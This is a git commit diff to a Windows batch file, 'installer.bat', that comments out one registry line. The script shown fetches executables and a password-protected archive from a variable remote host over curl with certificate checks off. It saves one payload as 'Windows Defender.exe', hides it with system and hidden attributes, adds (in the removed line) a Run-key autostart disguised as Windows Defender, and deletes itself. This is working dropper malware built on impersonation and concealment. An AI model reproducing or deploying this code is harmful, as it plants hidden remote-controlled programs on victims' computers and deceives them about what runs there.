f6ffcc2039082bd7f6e5cb49afd2c10845cf57cf
cryptedodissey <90626486+cryptedodissey@users.noreply.github.com>
2023-07-10 22:44:59 +0200

    Update installer.bat

--- Tools/installer.bat
+++ Tools/installer.bat
@@ -51,7 +51,7 @@ attrib -s -h -i "%environment%\expose.exe" && if exist "%environment%\expose.exe
    "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del "%temp%\apache2.7z"
 )
 
-REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
+rem REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 "%environment%\curl.exe" -k %proxy% %host%/sfx.exe -o "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe"
 endlocal
 DEL /s /f /q /a "%~f0"
